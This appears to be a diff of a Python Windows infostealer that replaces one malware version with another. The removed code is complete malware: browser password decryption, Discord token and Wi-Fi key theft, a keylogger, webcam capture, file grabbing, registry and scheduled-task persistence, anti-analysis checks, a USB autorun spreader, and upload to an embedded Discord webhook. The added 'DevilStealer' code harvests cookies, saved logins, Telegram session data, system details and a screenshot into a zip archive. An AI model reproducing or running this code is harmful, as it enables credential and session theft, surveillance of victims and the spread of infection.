@@ -1,452 +1,520 @@
-import os
-import sys
-import json
-import re
-import sqlite3
-import win32crypt
-import base64
-import shutil
-import requests
-import subprocess
-import tempfile
-import cv2
-import platform
-import socket
-import getpass
+import browser_cookie3
 import psutil
-import time
-import ctypes
-import threading
+import shutil
+import os
+import json
+import socket
+import platform
+import win32api
+import uuid
+import subprocess
+from PIL import ImageGrab
+import datetime
 import zipfile
-from datetime import datetime
-from Crypto.Cipher import AES
-from pynput import keyboard
-import winreg
 
-# ===== CONFIG =====
-WEBHOOK_URL = "[https://discord.com/api/webhooks/1394681552079949884/CptZDyJwJFbHHMHr5S194EEFNrMSML_OdGRP6G4Ia3zYME3kHOE1nUNHEmJuGApctkfy]"
-CHECK_INTERVAL = 300  # 5 minutes
-MAX_FILE_SIZE = 8 * 1024 * 1024  # 8MB (Discord limit)
-TEMP_DIR = tempfile.gettempdir()
-PERSISTENCE_NAMES = ["WindowsDefender", "SystemMetrics", "NvidiaDriver"]
-DISCORD_TOKEN_REGEX = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"
+FILE_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData"
+FILE_COOKIE = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\cookie"
+FILE_PASSWORDS = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\passwords"
+FILE_TG = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\tdata"
+SCREENSHOT_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming\DevilStealerData\screenshot.jpg"
+ZIP_PATH = fr"C:\Users\{os.getlogin()}\AppData\Roaming"
 
-# ===== MUTEX =====
-mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Global\\WindowsAudioService")
-if ctypes.GetLastError() == 183:
-    os._exit(0)
+hasProgram = {
+    "chrome": True,
+    "firefox": True,
+    "yandex": True,
+    "opera": True,
+    "amigo": True,
+    "edge": True,
+    "telegram": True,
+}
 
-# ===== UTILS =====
-def check_webhook():
-    try:
-        return requests.get(WEBHOOK_URL, timeout=10).status_code == 200
-    except:
-        return False
 
-def get_system_info():
-    return {
-        "ip": requests.get("https://api.ipify.org", timeout=10).text,
-        "hostname": socket.gethostname(),
-        "username": getpass.getuser(),
-        "os": f"{platform.system()} {platform.release()}",
-        "cpu": platform.processor(),
-        "ram": f"{round(psutil.virtual_memory().total / (1024 ** 3))}GB",
-        "gpu": str(subprocess.check_output("wmic path win32_VideoController get name", shell=True, stderr=subprocess.DEVNULL)),
-        "antivirus": str(subprocess.check_output('wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName', shell=True, stderr=subprocess.DEVNULL))
-    }
+def create_folder():
+    if not os.path.exists(FILE_PATH):
+        os.makedirs(FILE_PATH)
+    if not os.path.exists(FILE_COOKIE):
+        os.makedirs(FILE_COOKIE)
+    if not os.path.exists(FILE_TG):
+        os.makedirs(FILE_TG)
+    if not os.path.exists(FILE_PASSWORDS):
+        os.makedirs(FILE_PASSWORDS)
+    os.makedirs(FILE_TG, exist_ok=True)
 
-# ===== STEALTH TECHNIQUES =====
-def hide_file(path):
-    subprocess.run(
-        f'attrib +h +s "{path}"',
-        shell=True,
-        stderr=subprocess.DEVNULL,
-        stdout=subprocess.DEVNULL
-    )
 
-def self_delete():
-    try:
-        bat_path = os.path.join(TEMP_DIR, f"cleanup_{os.getpid()}.bat")
-        with open(bat_path, "w") as bat:
-            bat.write(f"""
-            @echo off
-            chcp 65001 >nul
-            timeout /t 3 /nobreak >nul
-            del "{sys.argv[0]}" /f /q
-            del "%~f0" /f /q
-            """)
-        subprocess.Popen(
-            bat_path, 
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.SW_HIDE,
-            shell=True
-        )
-    except:
-        pass
-
-# ===== CORE FEATURES =====
-def get_encryption_key(browser_path):
-    local_state_path = os.path.join(browser_path, "Local State")
-    if not os.path.exists(local_state_path):
-        return None
-    
-    with open(local_state_path, "r", encoding="utf-8") as f:
-        local_state = json.loads(f.read())
-    
-    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
-    try:
-        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
-    except:
-        return None
-
-def decrypt_password(encrypted_password, key):
-    try:
-        if encrypted_password.startswith((b"v10", b"v11")) and key:
-            iv = encrypted_password[3:15]
-            payload = encrypted_password[15:]
-            cipher = AES.new(key, AES.MODE_GCM, iv)
-            return cipher.decrypt(payload)[:-16].decode("utf-8")
+def save_cookies(cookies, browser_name):
+    if os.path.exists(FILE_PATH):
+        if os.path.exists(FILE_COOKIE):
+            filename = f"{FILE_COOKIE}/{browser_name}_cookies.json"
+            with open(filename, "w") as file:
+                formatted_cookies = [
+                    {"name": cookie.name, "value": cookie.value, "domain": cookie.domain, "path": cookie.path,
+                     "secure": cookie.secure, "expires": cookie.expires} for cookie in cookies]
+                json.dump(formatted_cookies, file, indent=4)
         else:
-            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
-    except:
-        return None
+            create_folder()
+            save_cookies(cookies, browser_name)
+    else:
+        create_folder()
+        save_cookies(cookies, browser_name)
 
-def steal_chromium_passwords():
-    credentials = []
-    browsers = {
-        "Google Chrome": "Google\\Chrome\\User Data",
-        "Microsoft Edge": "Microsoft\\Edge\\User Data",
-        "Brave": "BraveSoftware\\Brave-Browser\\User Data",
-        "Opera": "Opera Software\\Opera Stable"
-    }
 
-    for browser_name, relative_path in browsers.items():
-        try:
-            browser_path = os.path.join(os.getenv("LOCALAPPDATA"), relative_path)
-            login_data_path = os.path.join(browser_path, "Default\\Login Data")
-            
-            if not os.path.exists(login_data_path):
-                continue
-                
-            key = get_encryption_key(browser_path)
-            temp_db = os.path.join(TEMP_DIR, f"{browser_name.replace(' ', '_')}_{os.getpid()}.db")
-            
-            try:
-                shutil.copy2(login_data_path, temp_db)
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                
-                for url, username, encrypted_password in cursor.fetchall():
-                    if not encrypted_password:
-                        continue
-                        
-                    password = decrypt_password(encrypted_password, key)
-                    if password:
-                        credentials.append({
-                            "browser": browser_name,
-                            "url": url,
-                            "username": username,
-                            "password": password
-                        })
-            finally:
-                conn.close()
-                if os.path.exists(temp_db):
-                    os.remove(temp_db)
-        except:
-            continue
-            
-    return credentials
-
-def steal_discord_tokens():
-    tokens = []
-    discord_paths = [
-        os.getenv("APPDATA") + "\\Discord\\Local Storage\\leveldb\\",
-        os.getenv("APPDATA") + "\\DiscordPTB\\Local Storage\\leveldb\\",
-        os.getenv("APPDATA") + "\\DiscordCanary\\Local Storage\\leveldb\\",
-    ]
-    
-    for path in discord_paths:
-        if os.path.exists(path):
-            for file in os.listdir(path):
-                if file.endswith((".ldb", ".log")):
-                    try:
-                        with open(os.path.join(path, file), "r", errors="ignore") as f:
-                            for line in f:
-                                matches = re.findall(DISCORD_TOKEN_REGEX, line)
-                                tokens.extend(matches)
-                    except:
-                        pass
-    return list(set(tokens))
-
-def steal_wifi_passwords():
-    profiles = []
-    try:
-        output = subprocess.check_output(
-            ["netsh", "wlan", "show", "profiles"],
-            shell=True,
-            stderr=subprocess.DEVNULL
-        ).decode("utf-8", errors="ignore")
-        
-        for line in output.split("\n"):
-            if "All User Profile" in line:
-                ssid = line.split(":")[1].strip()
+def close_browser(browser_name):
+    if browser_name == "chrome":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'chrome.exe':
                 try:
-                    password_output = subprocess.check_output(
-                        ["netsh", "wlan", "show", "profile", ssid, "key=clear"],
-                        shell=True,
-                        stderr=subprocess.DEVNULL
-                    ).decode("utf-8", errors="ignore")
-                    
-                    if "Key Content" in password_output:
-                        password = password_output.split("Key Content")[1].split(":")[1].split("\n")[0].strip()
-                        profiles.append({"ssid": ssid, "password": password})
-                except:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
                     pass
-    except:
-        pass
-    return profiles
+    elif browser_name == "firefox":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'firefox.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
+    elif browser_name == "opera":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'opera.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
+    elif browser_name == "yandex":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'browser.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
+    elif browser_name == "amigo":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'browser.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
+    elif browser_name == "edge":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'msedge.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
+    elif browser_name == "tg":
+        for process in psutil.process_iter(attrs=['pid', 'name']):
+            if process.info['name'] == 'Telegram.exe':
+                try:
+                    psutil.Process(process.info['pid']).terminate()
+                except psutil.NoSuchProcess:
+                    pass
 
-def keylogger():
-    log_file = os.path.join(TEMP_DIR, "syslog.tmp")
-    
-    def on_press(key):
-        try:
-            with open(log_file, "a", encoding="utf-8") as f:
-                char = (
-                    key.char 
-                    if hasattr(key, "char") 
-                    else f"<{key.name}>" if hasattr(key, "name") 
-                    else str(key)
-                )
-                f.write(char)
-        except:
-            pass
-    
-    listener = keyboard.Listener(on_press=on_press)
-    listener.start()
-    
-    while True:
-        time.sleep(CHECK_INTERVAL)
-        if os.path.exists(log_file) and os.path.getsize(log_file) > 0:
-            try:
-                with open(log_file, "rb") as log_data:
-                    requests.post(
-                        WEBHOOK_URL, 
-                        files={"file": ("keys.txt", log_data)},
-                        timeout=10
-                    )
-                open(log_file, "w").close()
-            except:
-                pass
 
-def grab_files():
-    grabbed_files = []
-    extensions = [".txt", ".pdf", ".docx", ".xlsx", ".jpg", ".png", ".csv", ".sql"]
-    folders = ["Desktop", "Documents", "Downloads", "OneDrive"]
-    
-    for folder in folders:
-        full_path = os.path.join(os.getenv("USERPROFILE"), folder)
-        if not os.path.exists(full_path):
-            continue
-            
-        for root, _, files in os.walk(full_path):
-            for file in files:
-                if any(file.lower().endswith(ext) for ext in extensions):
-                    file_path = os.path.join(root, file)
-                    if os.path.isfile(file_path) and os.path.getsize(file_path) < MAX_FILE_SIZE:
-                        grabbed_files.append(file_path)
-    
-    return grabbed_files
-
-def webcam_snap():
+def yandex_cookie():
     try:
-        cam = cv2.VideoCapture(0)
-        if not cam or not cam.isOpened():
-            return None
-            
-        ret, frame = cam.read()
-        cam.release()
-        
-        if ret:
-            img_path = os.path.join(TEMP_DIR, f"webcam_{int(time.time())}.jpg")
-            cv2.imwrite(img_path, frame)
-            return img_path
+        close_browser("yandex")
+        cookies = browser_cookie3.yandex()
+        save_cookies(cookies, "yandex")
     except:
-        return None
+        save_cookies([], "yandex_error")
+        hasProgram['yandex'] = False
 
-# ===== PERSISTENCE =====
-def add_persistence():
-    # Startup folder (hidden)
+
+def chrome_cookie():
     try:
-        startup_path = os.path.join(
-            os.getenv("APPDATA"), 
-            "Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
-        )
-        exe_name = f"{PERSISTENCE_NAMES[0]}.exe"
-        target_path = os.path.join(startup_path, exe_name)
-        shutil.copy2(sys.argv[0], target_path)
-        hide_file(target_path)
+        close_browser("chrome")
+        cookies = browser_cookie3.chrome()
+        save_cookies(cookies, "chrome")
     except:
-        pass
-    
-    # Registry (hidden)
+        save_cookies([], "chrome_error")
+        hasProgram['chrome'] = False
+
+
+def firefox_cookie():
     try:
-        key = winreg.HKEY_CURRENT_USER
-        subkey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
-        with winreg.OpenKey(key, subkey, 0, winreg.KEY_WRITE) as regkey:
-            winreg.SetValueEx(regkey, PERSISTENCE_NAMES[1], 0, winreg.REG_SZ, sys.argv[0])
+        close_browser("firefox")
+        cookies = browser_cookie3.firefox()
+        save_cookies(cookies, "firefox")
     except:
-        pass
-    
-    # Task Scheduler (hidden)
+        save_cookies([], "firefox_error")
+        hasProgram['firefox'] = False
+
+
+def opera_cookie():
     try:
-        subprocess.run(
-            f'schtasks /create /tn "{PERSISTENCE_NAMES[2]}" /tr "{sys.argv[0]}" /sc onlogon /rl highest /f',
-            shell=True,
-            stderr=subprocess.DEVNULL,
-            stdout=subprocess.DEVNULL
-        )
+        close_browser("opera")
+        cookies = browser_cookie3.opera()
+        save_cookies(cookies, "opera")
     except:
-        pass
+        save_cookies([], "opera_error")
+        hasProgram['opera'] = False
 
-# ===== ANTI-ANALYSIS =====
-def anti_analysis():
-    vm_indicators = [
-        "vbox", "vmware", "virtualbox", "qemu", "xen", "hyperv",
-        "sandbox", "malware", "analysis", "wire", "fiddler", "procmon"
-    ]
-    
-    if any(indicator in platform.node().lower() for indicator in vm_indicators):
-        os._exit(0)
-        
-    if any(indicator in getpass.getuser().lower() for indicator in vm_indicators):
-        os._exit(0)
-    
-    for proc in psutil.process_iter():
-        try:
-            if any(indicator in proc.name().lower() for indicator in vm_indicators):
-                os._exit(0)
-        except:
-            pass
 
-# ===== USB SPREADER =====
-def usb_spreader():
-    while True:
-        try:
-            drives = [
-                d for d in os.popen("wmic logicaldisk get caption").read().split() 
-                if len(d) == 2 and os.path.exists(d)
-            ]
-            
-            for drive in drives:
-                target_exe = os.path.join(drive, "Private Photos.exe")
-                if not os.path.exists(target_exe):
-                    try:
-                        shutil.copy2(sys.argv[0], target_exe)
-                        hide_file(target_exe)
-                        
-                        with open(os.path.join(drive, "autorun.inf"), "w") as f:
-                            f.write(f"""[AutoRun]
-open=Private Photos.exe
-action=View vacation pictures
-icon=Private Photos.exe""")
-                            
-                        hide_file(os.path.join(drive, "autorun.inf"))
-                    except:
-                        pass
-        except:
-            pass
-        
-        time.sleep(60)
+def amigo_cookie():
+    try:
+        close_browser("amigo")
+        cookies = browser_cookie3.amigo()
+        save_cookies(cookies, "amigo")
+    except:
+        save_cookies([], "amigo_error")
+        hasProgram['amigo'] = False
 
-# ===== DATA EXFILTRATION =====
-def send_to_webhook(data):
-    def truncate(text, max_len=500):
-        text = str(text)
-        return text if len(text) <= max_len else f"{text[:max_len]}... [TRUNCATED]"
-    
-    embed = {
-        "title": "📁 New Victim Log",
-        "color": 0x3498db,
-        "fields": [
-            {
-                "name": "🖥 System Info", 
-                "value": f"```json\n{truncate(json.dumps(data['system'], indent=2))}\n```",
-                "inline": False
-            },
-            {
-                "name": "🔑 Discord Tokens", 
-                "value": truncate(", ".join(data["discord_tokens"]) or "None"),
-                "inline": True
-            },
-            {
-                "name": "📶 Wi-Fi Networks", 
-                "value": truncate(json.dumps(data["wifi_passwords"], indent=2)),
-                "inline": True
-            },
-            {
-                "name": "🌐 Browser Passwords", 
-                "value": f"{len(data['chromium_passwords'])} credentials collected",
-                "inline": False
-            }
-        ]
+
+def edge_cookie():
+    try:
+        close_browser("edge")
+        cookies = browser_cookie3.edge()
+        save_cookies(cookies, "edge")
+    except:
+        save_cookies([], "edge_error")
+        hasProgram['edge'] = False
+
+
+def getip():
+    hostname = socket.gethostname()
+    ip_address = socket.gethostbyname(hostname)
+    return ip_address
+
+
+def gethostname():
+    hostname = socket.gethostname()
+    return hostname
+
+
+def get_mac_address():
+    mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
+    return ":".join([mac[e:e + 2] for e in range(0, 12, 2)])
+
+
+def get_network_connections():
+    try:
+        result = subprocess.run(['netstat', '-ano'], capture_output=True, text=True, shell=True)
+        if result.returncode == 0:
+            return result.stdout.encode('utf-8', errors='ignore').decode('utf-8')
+        else:
+            return f"Error executing netstat: {result.stderr}"
+    except Exception as e:
+        return f"An error occurred: {e}"
+
+
+# получение информации пользователя
+def pcinfo():
+    cpu_info = {
+        "CPU Cores": psutil.cpu_count(logical=False),
+        "Logical CPUs": psutil.cpu_count(logical=True),
+        "CPU Frequency": psutil.cpu_freq().current,
+        "CPU Usage": psutil.cpu_percent(interval=1)
     }
-    
-    files = []
+
+    # Информация об оперативной памяти
+    memory_info = {
+        "Total Memory": psutil.virtual_memory().total,
+        "Available Memory": psutil.virtual_memory().available,
+        "Used Memory": psutil.virtual_memory().used,
+        "Memory Usage": psutil.virtual_memory().percent
+    }
     try:
-        if data.get("webcam"):
-            with open(data["webcam"], "rb") as f:
-                files.append(("webcam.jpg", f))
-                embed["image"] = {"url": "attachment://webcam.jpg"}
-                
-        for file_path in data.get("grabbed_files", [])[:3]:
-            with open(file_path, "rb") as f:
-                files.append((os.path.basename(file_path), f))
-                
-        requests.post(
-            WEBHOOK_URL,
-            files=files,
-            data={"payload_json": json.dumps({"embeds": [embed]})},
-            timeout=15
-        )
+        # Информация о дисках
+        disk_info = []
+        for partition in psutil.disk_partitions():
+            disk_info.append({
+                "Device": partition.device,
+                "Mount Point": partition.mountpoint,
+                "File System": partition.fstype,
+                "Total Space": psutil.disk_usage(partition.mountpoint).total,
+                "Used Space": psutil.disk_usage(partition.mountpoint).used,
+                "Free Space": psutil.disk_usage(partition.mountpoint).free,
+                "Disk Usage": psutil.disk_usage(partition.mountpoint).percent
+            })
     except:
-        pass
-    finally:
-        if data.get("webcam"):
-            try:
-                os.remove(data["webcam"])
-            except:
-                pass
-        for _, f in files:
-            try:
-                f.close()
-            except:
-                pass
+        disk_info = ["Disk(s) were not detected or an error occurred"]
 
-# ===== MAIN =====
-def main():
-    if not check_webhook():
-        os._exit(0)
-        
-    anti_analysis()
-    add_persistence()
-    self_delete()  # Remove original file
-    
-    threading.Thread(target=keylogger, daemon=True).start()
-    threading.Thread(target=usb_spreader, daemon=True).start()
-    
-    while True:
-        data = {
-            "system": get_system_info(),
-            "discord_tokens": steal_discord_tokens(),
-            "chromium_passwords": steal_chromium_passwords(),
-            "wifi_passwords": steal_wifi_passwords(),
-            "grabbed_files": grab_files(),
-            "webcam": webcam_snap(),
-        }
-        
-        send_to_webhook(data)
-        time.sleep(CHECK_INTERVAL)
+    # Операционная система
+    os_info = {
+        "System": platform.system(),
+        "Release": platform.release(),
+        "Version": platform.version()
+    }
+    try:
+        graphics_cards = []
+        devices = win32api.EnumDisplayDevices(None, 0)
+        for device in devices:
+            if device.DeviceName not in [dev.DeviceName for dev in graphics_cards]:
+                graphics_cards.append(device)
 
-if __name__ == "__main__":
-    main()
+        gpu_info = []
+        for index, card in enumerate(graphics_cards):
+            gpu_info.append({
+                "GPU": f"GPU {index + 1}:",
+                "Device Name": card.DeviceName,
+                "Description": card.DeviceString,
+                "Driver Version": card.DeviceKey[-8:]
+            })
+    except:
+        gpu_info = ["Graphics processor(s) were not detected or an error occurred"]
+
+    if not os.path.exists(FILE_PATH):
+        create_folder()
+
+    with open(f"{FILE_PATH}/PC INFO.txt", "w") as file:
+        current_datetime = datetime.datetime.now()
+        formatted_datetime = current_datetime.strftime("%Y-%m-%d %H:%M:%S")
+        file.write(f"""Информация о компьютере на котором был запущен стиллер
+----------------------------------------------
+Время запуска стиллера: {formatted_datetime}
+Имя компьютера/пользователя: {os.getlogin()}
+
+Айпи адрес: {getip()}
+MAC-Адрес: {get_mac_address()}
+Хост нейм: {gethostname()}
+Информация о сетевых подключениях: {get_network_connections()}
+
+Найденно програм:
+{hasProgram}
+(True - найденно, False - не найденно)
+
+CPU INFO:
+{cpu_info}
+
+GPU INFO:
+{gpu_info}
+
+MEMORY INFO:
+{memory_info}
+
+DISK INFO:
+{disk_info}
+
+OS INFO:
+{os_info}
+
+
+STEALER BY 0XSN1KKY :)
+
+----------------------------------------------
+
+
+Information about the computer on which the stealer was launched
+----------------------------------------------
+Steeler start time: {formatted_datetime}
+Computer/username: {os.getlogin()}
+
+IP address: {getip()}
+MAC Address: {get_mac_address()}
+Hostname: {gethostname()}
+Network connection information: {get_network_connections()}
+
+Programs found:
+{hasProgram}
+(True - found, False - not found)
+
+CPU INFO:
+{cpu_info}
+
+GPU INFO:
+{gpu_info}
+
+MEMORY INFO:
+{memory_info}
+
+DISK INFO:
+{disk_info}
+
+OS INFO:
+{os_info}
+
+
+STEALER BY 0XSN1KKY :)
+
+----------------------------------------------""")
+        file.close()
+
+
+def take_screenshot(format="JPEG"):
+    screenshot = ImageGrab.grab()
+    screenshot.save(SCREENSHOT_PATH, format)
+
+
+def telegram_steal():
+    source_folder = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Telegram Desktop", "tdata")
+    destination_folder = FILE_TG
+
+    if not os.path.exists(destination_folder):
+        create_folder()
+
+    try:
+        close_browser("tg")
+        for root, dirs, files in os.walk(source_folder):
+            for file in files:
+                source_file = os.path.join(root, file)
+                relative_path = os.path.relpath(source_file, source_folder)
+                destination_file = os.path.join(destination_folder, relative_path)
+
+                destination_dir = os.path.dirname(destination_file)
+                os.makedirs(destination_dir, exist_ok=True)
+
+                shutil.copy(source_file, destination_file)
+    except:
+        hasProgram['telegram'] = False
+
+
+
+def chrome_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+    try:
+        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data",
+                                   "Default", "Login Data")
+
+        if not os.path.exists(FILE_PASSWORDS + "/Chrome"):
+            os.makedirs(FILE_PASSWORDS + "/Chrome")
+
+        close_browser("chrome")
+        shutil.copy(source_path, f"{FILE_PASSWORDS}/Chrome")
+    except:
+        hasProgram['chrome'] = False
+
+
+def firefox_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+    try:
+        profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
+        profile_folder = os.listdir(profile_path)[1]
+
+        source_path = os.path.join(profile_path, profile_folder, "logins.json")
+        destination_folder = os.path.join(FILE_PASSWORDS, "Firefox")
+
+        if not os.path.exists(destination_folder):
+            os.makedirs(destination_folder)
+
+        close_browser("firefox")
+
+        shutil.copy(source_path, destination_folder)
+    except:
+        try:
+            profile_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox", "Profiles")
+            profile_folder = os.listdir(profile_path)[0]
+
+            source_path = os.path.join(profile_path, profile_folder, "logins.json")
+            destination_folder = os.path.join(FILE_PASSWORDS, "Firefox")
+
+            if not os.path.exists(destination_folder):
+                os.makedirs(destination_folder)
+
+            close_browser("firefox")
+
+            shutil.copy(source_path, destination_folder)
+        except:
+            hasProgram['firefox'] = False
+
+
+def yandex_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+    try:
+        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Yandex", "YandexBrowser",
+                                   "User Data", "Default", "Ya Login Data")
+
+        if not os.path.exists(FILE_PASSWORDS + "/Yandex"):
+            os.makedirs(FILE_PASSWORDS + "/Yandex")
+
+        close_browser("yandex")
+        shutil.copy(source_path, f"{FILE_PASSWORDS}/Yandex")
+    except:
+        hasProgram['yandex'] = False
+
+
+def opera_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+
+    try:
+        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera Stable",
+                                   "Login Data")
+
+        if not os.path.exists(FILE_PASSWORDS + "/Opera"):
+            os.makedirs(FILE_PASSWORDS + "/Opera")
+
+        close_browser("opera")
+        shutil.copy(source_path, f"{FILE_PASSWORDS}/Opera")
+    except:
+        hasProgram['opera'] = False
+
+
+def amigo_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+
+    try:
+        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Amigo", "User Data", "Default",
+                                   "Login Data")
+
+        if not os.path.exists(FILE_PASSWORDS + "/Amigo"):
+            os.makedirs(FILE_PASSWORDS + "/Amigo")
+
+        close_browser("amigo")
+        shutil.copy(source_path, f"{FILE_PASSWORDS}/Amigo")
+    except:
+        hasProgram['amigo'] = False
+
+
+def edge_passwords():
+    if not os.path.exists(FILE_PASSWORDS):
+        create_folder()
+
+    try:
+        source_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data",
+                                   "Default", "Web Data")
+
+        if not os.path.exists(FILE_PASSWORDS + "/Edge"):
+            os.makedirs(FILE_PASSWORDS + "/Edge")
+
+        close_browser("edge")
+        shutil.copy(source_path, f"{FILE_PASSWORDS}/Edge")
+    except:
+        hasProgram['edge'] = False
+
+
+def create_zip_archive():
+    global ZIP_PATH
+    ZIP_PATH = os.path.join(ZIP_PATH, f"{os.getlogin()} logs.zip")
+
+    with zipfile.ZipFile(ZIP_PATH, 'w', compression=zipfile.ZIP_BZIP2, allowZip64=True) as zipf:
+        for root, _, files in os.walk(FILE_PATH):
+            for file in files:
+                file_path = os.path.join(root, file)
+                arcname = os.path.relpath(file_path, FILE_PATH)
+                zipf.write(file_path, arcname)
+
+    return True
+
+def delFolder():
+    shutil.rmtree(FILE_PATH)
+    os.remove(ZIP_PATH)
+
+
+
+def steal_all():
+    # telegram
+    telegram_steal()
+    # browser cookie
+    chrome_cookie()
+    firefox_cookie()
+    opera_cookie()
+    yandex_cookie()
+    amigo_cookie()
+    edge_cookie()
+
+    # browser passwords
+    chrome_passwords()
+    firefox_passwords()
+    opera_passwords()
+    yandex_passwords()
+    amigo_passwords()
+    edge_passwords()
+
+    # other
+    take_screenshot()
+    pcinfo()
